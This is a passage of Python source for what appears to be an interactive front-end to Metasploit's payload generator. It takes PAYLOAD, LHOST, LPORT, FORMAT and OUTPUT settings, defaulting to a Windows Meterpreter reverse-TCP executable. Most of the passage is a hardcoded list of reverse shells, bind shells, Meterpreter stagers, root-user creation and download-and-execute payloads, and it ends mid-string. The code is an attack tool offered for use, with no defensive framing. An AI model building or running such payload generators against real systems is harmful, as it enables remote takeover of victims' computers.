                    print("\x1b[1m\x1b[33mOption\x1b[37m                     \x1b[33mCurrent Setting\x1b[37m                     \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m                    \x1b[33m===============\x1b[37m                     \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nPAYLOAD{}         YES          Type '--list payloads' or '-lp' to see payloads \x1b[32mDefault: windows/meterpreter/reverse_tcp\x1b[37m\nLHOST  {}         YES          Your IP address = \x1b[32m{}\x1b[37m\nLPORT  {}         YES          Type in port \x1b[32mDefault = 4444\x1b[37m\nFORMAT {}         YES          Specify the payload format \x1b[32mDefault = exe\x1b[37m\nOUTPUT {}         YES          Output \x1b[32mex: /root/Desktop/mksec.exe\x1b[37m".format(payload,host,ipv4,port,format,output))
                elif "set payload" in uinput.lower():
                    payload = uinput
                    payload = payload.replace("set payload ","").replace("set PAYLOAD ","").replace("SET payload ","").replace("SET PAYLOAD ","").center(50)
                elif "set lhost" in uinput.lower():
                    host = uinput
                    host = host.replace("set lhost ","").replace("set LHOST ","").replace("SET lhost ","").replace("SET LHOST ","").center(50)
                elif "set port" in uinput.lower():
                    port = uinput
                    port = port.replace("set lport ","").replace("set LPORT ","").replace("SET lport ","").replace("SET LPORT ","").center(50)
                elif "set format" in uinput.lower():
                    format = uinput
                    format = format.replace("set format ","").replace("set FORMAT ","").replace("SET format ","").replace("SET FORMAT ","").center(50).lower()
                elif "set output" in uinput.lower():
                    output = uinput
                    output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(50)
                elif "--list payload" in uinput.lower() or "-lp" == uinput.lower():
                    print("""\x1b[1m\x1b[33mFramework Payloads (592 total)\x1b[37m\n\x1b[33m==================================================\x1b[37m\n\n\x1b[33mName\x1b[37m                                                \x1b[33mDescription\x1b[37m\n\x1b[33m----\x1b[37m                                                \x1b[33m-----------\x1b[37m\naix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\naix/ppc/shell_find_port                             Spawn a shell on an established connection\naix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)\naix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nandroid/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP\nandroid/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS\nandroid/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager\nandroid/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell\nandroid/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell\nandroid/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell\nandroid/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP\nandroid/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS\nandroid/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager\napple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell\napple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\napple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\napple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\nbsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell\nbsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nbsd/vax/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x64/exec                                        Execute an arbitrary command\nbsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6\nbsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\nbsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell\nbsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6\nbsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell\nbsd/x86/exec                                        Execute an arbitrary command\nbsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\nbsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\nbsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6\nbsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\nbsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection\nbsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6\nbsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\nbsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\nbsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6\nbsd/x86/shell_find_port                             Spawn a shell on an established connection\nbsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\nbsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6\nbsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection\nbsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker\nbsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell\nbsdi/x86/shell_find_port                            Spawn a shell on an established connection\nbsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell\ncmd/mainframe/apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library. Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)\ncmd/mainframe/bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\ncmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads\ncmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\ncmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWKcmd/unix/bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetdcmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)cmd/unix/bind_jjs                                   Listen for a connection and spawn a command shell via jjs\ncmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua\ncmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs\ncmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl\ncmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl\ncmd/unix/bind_r                                     Continually listen for a connection and spawn a command shell via R\ncmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby\ncmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby\ncmd/unix/bind_socat_udp                             Creates an interactive shell via socat\ncmd/unix/bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)\ncmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\ncmd/unix/generic                                    Executes the supplied command\ncmd/unix/interact                                   Interacts with a shell on an established socket connection\ncmd/unix/pingback_bind                              Accept a connection, send a UUID, then exit\ncmd/unix/pingback_reverse                           Creates a socket, send a UUID, then exit\ncmd/unix/reverse                                    Creates an interactive shell through two inbound connections\ncmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK\ncmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bashwithout the /dev/tcp feature.\ncmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.\ncmd/unix/reverse_bash_udp                           Creates an interactive shell via bash's builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bashwithout the /dev/udp feature.\ncmd/unix/reverse_jjs                                Connect back and create a command shell via jjs\ncmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn't usually installed by default.\ncmd/unix/reverse_lua                                Creates an interactive shell via Lua\ncmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode\ncmd/unix/reverse_netcat                             Creates an interactive shell via netcat\ncmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat\ncmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs\ncmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections\ncmd/unix/reverse_perl                               Creates an interactive shell via perl\ncmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL\ncmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL\ncmd/unix/reverse_python                             Connect back and create a command shell via Python\ncmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.\ncmd/unix/reverse_r                                  Connect back and create a command shell via R\ncmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby\ncmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL\ncmd/unix/reverse_socat_udp                          Creates an interactive shell via socat\ncmd/unix/reverse_ssh                                Connect back and create a command shell via SSH\ncmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option\ncmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)\ncmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh\ncmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\ncmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\ncmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua\ncmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)\ncmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)\ncmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby\ncmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.\ncmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it\ncmd/windows/generic                                 Executes the supplied command\ncmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection\ncmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection\ncmd/windows/reverse_lua                             Creates an interactive shell via Lua\ncmd/windows/reverse_perl                            Creates an interactive shell via perl\ncmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell\ncmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby\nfirefox/exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript "launcher" to disk that hides the prompt.\nfirefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API\nfirefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API\ngeneric/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.\ngeneric/debug_trap                                  Generate a debug trap in the target process\ngeneric/shell_bind_tcp                              Listen for a connection and spawn a command shell\ngeneric/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\ngeneric/tight_loop                                  Generate a tight loop in the target process\njava/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell\njava/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell\njava/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection\njava/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP\njava/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS\njava/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager\njava/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection\njava/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager\njava/shell_reverse_tcp                              Connect back to attacker and spawn a command shell\nlinux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker\nlinux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker\nlinux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\nlinux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell\nlinux/armle/adduser                                 Create a new user with UID 0\nlinux/armle/exec                                    Execute an arbitrary command\nlinux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection\nlinux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker\nlinux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection\nlinux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker\nlinux/armle/shell_bind_tcp                          Connect to target and spawn a command shell\nlinux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\nlinux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\nlinux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.\nlinux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\nlinux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.\nlinux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\nlinux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell\nlinux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\nlinux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.\nlinux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\nlinux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.\nlinux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\nlinux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell\nlinux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\nlinux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/ppc/shell_find_port                           Spawn a shell on an established connection\nlinux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell\nlinux/ppc64/shell_find_port                         Spawn a shell on an established connection\nlinux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\nlinux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/exec                                      Execute an arbitrary command or just a /bin/sh shell\nlinux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection\nlinux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)\nlinux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)\nlinux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\nlinux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nlinux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell\nlinux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\nlinux/x64/shell_find_port                           Spawn a shell on an established connection\nlinux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6\nlinux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/x86/adduser                                   Create a new user with UID 0\nlinux/x86/chmod                                     Runs chmod on specified file with specified mode\nlinux/x86/exec                                      Execute an arbitrary command or just a /bin/sh shell\nlinux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)\nlinux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\nlinux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection\nlinux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)\nlinux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)\nlinux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection\nlinux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6\nlinux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service\nlinux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service\nlinux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor\nlinux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)\nlinux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\nlinux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection\nlinux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)\nlinux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)\nlinux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection\nlinux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6\nlinux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell\nlinux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\nlinux/x86/shell_find_port                           Spawn a shell on an established connection\nlinux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)\nlinux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6\nlinux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nmainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\nmulti/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP\nmulti/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS\nnetware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker\nnodejs/shell_bind_tcp                               Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL\nosx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection\nosx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\nosx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell\nosx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nosx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.\nosx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\nosx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection\nosx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\nosx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\nosx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute\nosx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute\nosx/x64/dupandexecve/reverse_tcp_uuid               dup2 socket in edi, then execve. Connect back to the attacker with UUID Support (OSX x64)\nosx/x64/exec                                        Execute an arbitrary command\nosx/x64/meterpreter/bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute\nosx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute\nosx/x64/meterpreter/reverse_tcp_uuid                Inject the mettle server payload (staged). Connect back to the attacker with UUID Support (OSX x64)\nosx/x64/meterpreter_reverse_http                    Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/meterpreter_reverse_https                   Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/meterpreter_reverse_tcp                     Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech\nosx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\nosx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\nosx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute\nosx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute\nosx/x86/exec                                        Execute an arbitrary command\nosx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute\nosx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute\nosx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\nosx/x86/shell_find_port                             Spawn a shell on an established connection\nosx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute\nosx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute\nosx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell\nosx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell\nphp/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)\nphp/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6\nphp/bind_php                                        Listen for a connection and spawn a command shell via php\nphp/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)\nphp/download_exec                                   Download an EXE from an HTTP URL and execute it\nphp/exec                                            Execute a single system command\nphp/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection\nphp/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6\nphp/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support\nphp/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support\nphp/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\nphp/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\nphp/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)\nphp/reverse_perl                                    Creates an interactive shell via perl\nphp/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions\nphp/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably agood idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.\npython/meterpreter/bind_tcp                         Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection\npython/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection with UUID Support\npython/meterpreter/reverse_http                     Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Tunnel communication over HTTP\npython/meterpreter/reverse_https                    Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Tunnel communication over HTTP using SSL\npython/meterpreter/reverse_tcp                      Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker\npython/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Reverse Python connect back stager using SSL\npython/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker with UUID Support\npython/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell\npython/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell\npython/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter 